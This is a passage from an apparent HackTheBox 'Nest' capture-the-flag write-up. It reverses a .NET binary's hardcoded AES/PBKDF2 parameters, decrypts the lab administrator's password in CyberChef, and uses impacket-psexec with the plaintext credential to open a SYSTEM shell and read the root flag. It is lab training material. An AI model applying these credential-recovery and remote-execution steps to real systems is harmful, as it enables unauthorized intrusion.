+</pre></td><td class="rouge-code"><pre><span class="k">foreach</span> <span class="p">(</span><span class="kt">string</span> <span class="n">text2</span> <span class="k">in</span> <span class="n">list</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">text2</span><span class="p">);</span>
+	<span class="n">Process</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="s">"HqkDbImport.exe /ImportLdapUser "</span> <span class="p">+</span> <span class="n">text2</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>When the program iterates over the file passed with the cmdline arguments we can see that it’s doing something to the password before assigning it to <code class="language-plaintext highlighter-rouge">ldapSearchSettings.Password</code>.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"Password="</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">CurrentCultureIgnoreCase</span><span class="p">))</span>
+<span class="p">{</span>
+      <span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Password</span> <span class="p">=</span> <span class="n">CR</span><span class="p">.</span><span class="nf">DS</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">IndexOf</span><span class="p">(</span><span class="sc">'='</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">));</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>It is applying a function named <code class="language-plaintext highlighter-rouge">CR.DS</code> to the password. Let’s investigate what this function does.</p>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_9.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_9.png" alt="img_9" loading="lazy"></a></p>
+
+<p>We can see that <code class="language-plaintext highlighter-rouge">CR.DS</code> receives an encrypted string as a parameter, then passes it to <code class="language-plaintext highlighter-rouge">CR.RD</code> method as a parameter.
+Let’s see more about CR.RD:</p>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_10.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_10.png" alt="img_10" loading="lazy"></a></p>
+
+<p>I don’t know exactly how this code works, but I know it decrypts an AES ciphertext in CBC Mode using a PBKDF2 key. So, we can try to use these values in order to decrypt the administrator password.
+We can get the encryption parameters looking at the encryption/decryption functions (<code class="language-plaintext highlighter-rouge">CR.ES/CR.DS</code>), let’s take a look into the decryption functions.</p>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">DS</span><span class="p">(</span><span class="kt">string</span> <span class="n">EncryptedString</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">))</span>
+    <span class="p">{</span>
+    <span class="k">return</span> <span class="kt">string</span><span class="p">.</span><span class="n">Empty</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">CR</span><span class="p">.</span><span class="nf">RD</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span> <span class="s">"667912"</span><span class="p">,</span> <span class="s">"1313Rf99"</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="s">"1L1SA61493DRV53Z"</span><span class="p">,</span> <span class="m">256</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">private</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">RD</span><span class="p">(</span><span class="kt">string</span> <span class="n">cipherText</span><span class="p">,</span> <span class="kt">string</span> <span class="n">passPhrase</span><span class="p">,</span> <span class="kt">string</span> <span class="n">saltValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">passwordIterations</span><span class="p">,</span> <span class="kt">string</span> <span class="n">initVector</span><span class="p">,</span> <span class="kt">int</span> <span class="n">keySize</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">);</span>
+    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes2</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">);</span>
+    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>We can see that RD is receiving the parameters in the following order:
+cipherText, passPhrase, saltValue, etc. Based on the parameters <code class="language-plaintext highlighter-rouge">DS</code> passes to <code class="language-plaintext highlighter-rouge">RD</code>, we can conclude that:</p>
+
+<div class="table-wrapper"><table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Key</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">passPhrase</td>
+      <td>667912</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">saltValue</td>
+      <td>1313Rf99</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">passwordIterations</td>
+      <td>3</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Init Vector</td>
+      <td>1L1SA61493DRV53Z</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">keySize</td>
+      <td>256</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 id="decrypting-administrator-password"><span class="me-2">Decrypting Administrator Password</span><a href="#decrypting-administrator-password" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Well, I came up with three differents way to do this.</p>
+
+<ol>
+  <li>Using Cyberchef</li>
+  <li>Copying the decrypt function (<code class="language-plaintext highlighter-rouge">RD</code>) and passing the encrypted password (just as we did with C.Smith’s password).</li>
+  <li>Copying the <code class="language-plaintext highlighter-rouge">Ldap.conf</code> file from <code class="language-plaintext highlighter-rouge">HQK Service</code> and pass it to the <code class="language-plaintext highlighter-rouge">HqkLdap binary</code> as an argument; then use breakpoints to read the
+ldapSearchSettings Password property.</li>
+</ol>
+
+<div class="language-cs highlighter-rouge"><div class="code-header">
+        <span data-label-text="C#"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"Password="</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">CurrentCultureIgnoreCase</span><span class="p">))</span>
+<span class="p">{</span>
+  <span class="n">ldapSearchSettings</span><span class="p">.</span><span class="n">Password</span> <span class="p">=</span> <span class="n">CR</span><span class="p">.</span><span class="nf">DS</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">IndexOf</span><span class="p">(</span><span class="sc">'='</span><span class="p">)</span> <span class="p">+</span> <span class="m">1</span><span class="p">));</span> <span class="c1">// Here</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>I’m going to do the first one, as I already did the second one and I’m to lazy to do the third.</p>
+
+<h4 id="cyberchef"><span class="me-2">Cyberchef</span><a href="#cyberchef" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+
+<p>We can use <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to create the <code class="language-plaintext highlighter-rouge">PBKDF2</code> key, and the use it to decrypt the password.
+To create the PBKDF2 key, we need the following values:</p>
+
+<ol>
+  <li>A Passphrase</li>
+  <li>The key size</li>
+  <li>Number of iterations</li>
+  <li>A salt value</li>
+</ol>
+
+<blockquote>
+  <h4 id="getting-the-key"><span class="me-2">Getting the key</span><a href="#getting-the-key" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_11.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_11.png" alt="img_11" loading="lazy"></a>
+Nice, we’ve got the key; now let’s decrypt the password.</p>
+
+<blockquote>
+  <h4 id="getting-the-password"><span class="me-2">Getting the password</span><a href="#getting-the-password" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
+</blockquote>
+
+<p><a href="/assets/img/HackTheBox/Nest/img_12.png" class="popup img-link  shimmer"><img src="/assets/img/HackTheBox/Nest/img_12.png" alt="img_12" loading="lazy"></a>
+And there it is the administrator password. Now let’s try to use these credentials to gain administrator access and read the root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre>❯ impacket-psexec Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.178.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file kfKTarfJ.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.178.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service kjNv on 10.10.10.178.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service kjNv.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+56c9b8c7e...
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>And that’s all. I enjoyed this machine a lot, but I don’t know what the author was thinking when he cataloged it as an easy machine.</p>
 </div>
 
   <div class="post-tail-wrapper text-muted">
